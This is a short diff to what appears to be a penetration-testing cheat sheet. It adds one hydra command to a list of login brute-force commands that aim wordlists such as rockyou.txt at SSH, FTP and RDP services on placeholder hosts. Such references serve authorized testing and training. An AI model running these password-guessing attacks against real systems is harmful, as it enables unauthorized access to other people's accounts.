@@ -4970,6 +4970,7 @@ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
 hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
 hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://IP   //SSH Attack with user
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4
 hydra -l USER -P wordlist  IP -t 4 ssh -V
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "PASSWORD" rdp://IP  //RDP Attack
 ```
